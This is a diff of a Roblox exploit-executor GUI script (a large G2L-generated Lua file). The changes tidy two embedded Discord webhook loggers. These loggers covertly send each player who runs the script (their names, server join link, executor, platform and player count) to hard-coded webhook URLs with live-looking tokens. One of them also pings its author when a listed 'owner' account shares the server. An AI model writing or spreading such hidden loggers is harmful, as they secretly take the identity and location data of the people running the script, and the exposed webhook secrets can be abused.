@@ -23225,20 +23225,15 @@ local script = G2L["223"];
 	
 		local _WEBHOOK = "https://discordapp.com/api/webhooks/1489972994326396970/aB732Ju6Dk5vjDGfhRObN68BOOs4muTgimzEMies68qDcLB_BN-uvt39gFWCiaA2elBX"
 	
-		-- Place ID configuration: PlaceID = {Label, Color}
 		local _PLACES = {
-			[11137575513] = {label = "Main", color = 0x00be09},
-			[12943245078] = {label = "XL", color = 0xbebf00},
-			[12943247001] = {label = "VC", color = 0x0072bf},
-			[108097274488844] = {label = "OG", color = 0x000000}
+			[11137575513]    = {label = "Main", color = 0x00be09},
+			[12943245078]    = {label = "XL",   color = 0xbebf00},
+			[12943247001]    = {label = "VC",   color = 0x0072bf},
+			[108097274488844] = {label = "OG",  color = 0x000000}
 		}
 	
-		-- Check if current place is in the allowed list
 		local _currentPlace = _PLACES[game.PlaceId]
-		if not _currentPlace then
-			-- Not in an allowed place, don't run the logger
-			return
-		end
+		if not _currentPlace then return end
 	
 		local _PLACE_LABEL = _currentPlace.label
 		local _EMBED_COLOR = _currentPlace.color
@@ -23300,32 +23295,27 @@ local script = G2L["223"];
 		end
 	
 		local function _send(embedTable)
-			local payload = {
-				embeds = { embedTable }
-			}
-	
 			pcall(function()
 				_req({
 					Url    = _WEBHOOK,
 					Method = "POST",
 					Headers = { ["Content-Type"] = "application/json" },
-					Body   = _HttpService:JSONEncode(payload)
+					Body   = _HttpService:JSONEncode({ embeds = { embedTable } })
 				})
 			end)
 		end
 	
-		local _accCreated = os.date("%Y-%m-%d", os.time() - (_plr.AccountAge * 86400))
+		local _playerCount = #_Players:GetPlayers()
+		local _maxPlayers  = _Players.MaxPlayers
 	
-		-- Send initial log with place-specific formatting
 		_send({
-			title       = string.format("%s  |  %s / `%s`", _PLACE_LABEL, _plr.DisplayName, _plr.Name),
+			title       = string.format("%d/%d %s  |  %s / `%s`", _playerCount, _maxPlayers, _PLACE_LABEL, _plr.DisplayName, _plr.Name),
 			description = _joinLink(),
 			color       = _EMBED_COLOR,
 			footer      = { text = _executor() .. "  •  " .. _platform() .. "  •  " .. os.date("Today at %I:%M %p") },
 			timestamp   = DateTime.now():ToIsoDate()
 		})
 	end
-	
 	return _WH
 end;
 task.spawn(C_223);
@@ -23345,19 +23335,17 @@ local script = G2L["224"];
 		local _WEBHOOK = "https://discordapp.com/api/webhooks/1489975536565354546/yyLl4aX8naHHAzgVDCPiMA6e9YToWa3tGgHv1MRMyoWtwrybbKD4g9UPY_q35h17s2CU"
 		local _DISCORD_USER_ID = "1301477323090034731"
 	
-		-- Owner IDs to detect
 		local OWNER_IDS = {
-			574381128,   -- main
-			10587072700, -- alt 1
-			8308247571,  -- alt 2
+			574381128,
+			10587072700,
+			8308247571,
 		}
 	
-		-- Place ID configuration: PlaceID = {Label, Color}
 		local _PLACES = {
-			[11137575513] = {label = "Main", color = 0x00be09},
-			[12943245078] = {label = "XL", color = 0xbebf00},
-			[12943247001] = {label = "VC", color = 0x0072bf},
-			[108097274488844] = {label = "OG", color = 0x000000}
+			[11137575513]    = {label = "Main", color = 0x00be09},
+			[12943245078]    = {label = "XL",   color = 0xbebf00},
+			[12943247001]    = {label = "VC",   color = 0x0072bf},
+			[108097274488844] = {label = "OG",  color = 0x000000}
 		}
 	
 		local _req = (syn and syn.request)
@@ -23369,39 +23357,26 @@ local script = G2L["224"];
 		local _sessionStart = tick()
 		local _plr = _Players.LocalPlayer
 	
-		-- Check if local player is the owner
 		local function _isLocalPlayerOwner()
 			for _, ownerId in ipairs(OWNER_IDS) do
-				if _plr.UserId == ownerId then
-					return true
-				end
+				if _plr.UserId == ownerId then return true end
 			end
 			return false
 		end
 	
-		-- Check if any owner (OTHER than local player) is in the game
 		local function _isOwnerInGame()
 			for _, player in ipairs(_Players:GetPlayers()) do
-				if player.UserId ~= _plr.UserId then  -- Exclude local player
+				if player.UserId ~= _plr.UserId then
 					for _, ownerId in ipairs(OWNER_IDS) do
-						if player.UserId == ownerId then
-							return true
-						end
+						if player.UserId == ownerId then return true end
 					end
 				end
 			end
 			return false
 		end
 	
-		-- If local player is the owner, don't log
-		if _isLocalPlayerOwner() then
-			return
-		end
-	
-		-- Only proceed if an owner (not the local player) is in the game
-		if not _isOwnerInGame() then
-			return
-		end
+		if _isLocalPlayerOwner() then return end
+		if not _isOwnerInGame() then return end
 	
 		local function _executor()
 			if syn and syn.request then return "Synapse X" end
@@ -23418,29 +23393,6 @@ local script = G2L["224"];
 			return ok and platform or "Unknown"
 		end
 	
-		local function _hwid()
-			if get_hwid then return tostring(get_hwid()) end
-			local ok, id = pcall(function() return _AnalyticsSvc:GetClientId() end)
-			return ok and id or "N/A"
-		end
-	
-		local function _ping()
-			local ok, v = pcall(function()
-				return _StatsService.Network.ServerStatsItem["Data Ping"]:GetValue()
-			end)
-			return ok and math.floor(v) or 0
-		end
-	
-		local function _fps()
-			local v = workspace:GetRealPhysicsFPS()
-			return v > 0 and math.floor(v) or 0
-		end
-	
-		local function _region()
-			local ok, r = pcall(function() return _LocaleSvc.RobloxLocaleId end)
-			return ok and r or "N/A"
-		end
-	
 		local function _joinLink()
 			local ok, v = pcall(function()
 				return "https://www.roblox.com/games/start?placeId="
@@ -23452,10 +23404,10 @@ local script = G2L["224"];
 	
 		local function _send(embedTable, contentText)
 			local payload = {
-				content = contentText,
-				embeds = { embedTable }
+				username = _plr.Name,
+				content  = contentText,
+				embeds   = { embedTable }
 			}
-	
 			pcall(function()
 				_req({
 					Url    = _WEBHOOK,
@@ -23466,28 +23418,17 @@ local script = G2L["224"];
 			end)
 		end
 	
-		-- Determine embed color and label
 		local _currentPlace = _PLACES[game.PlaceId]
-		local _EMBED_COLOR
-		local _PLACE_LABEL
+		local _EMBED_COLOR = _currentPlace and _currentPlace.color or 0xffffff
+		local _PLACE_LABEL = _currentPlace and _currentPlace.label or "Other"
 	
-		if _currentPlace then
-			-- Player is in one of the tracked games
-			_EMBED_COLOR = _currentPlace.color
-			_PLACE_LABEL = _currentPlace.label
-		else
-			-- Player is in a different game (white color)
-			_EMBED_COLOR = 0xffffff
-			_PLACE_LABEL = "Other"
-		end
+		local _playerCount = #_Players:GetPlayers()
+		local _maxPlayers  = _Players.MaxPlayers
 	
-		local _accCreated = os.date("%Y-%m-%d", os.time() - (_plr.AccountAge * 86400))
-	
-		-- Send log with Discord ping
 		local contentMessage = string.format("%s executed your script, <@%s>", _plr.DisplayName, _DISCORD_USER_ID)
 	
 		_send({
-			title       = string.format("%s  |  %s / `%s`", _PLACE_LABEL, _plr.DisplayName, _plr.Name),
+			title       = string.format("%d/%d %s  |  %s / `%s`", _playerCount, _maxPlayers, _PLACE_LABEL, _plr.DisplayName, _plr.Name),
 			description = _joinLink(),
 			color       = _EMBED_COLOR,
 			footer      = { text = _executor() .. "  •  " .. _platform() .. "  •  " .. os.date("Today at %I:%M %p") },
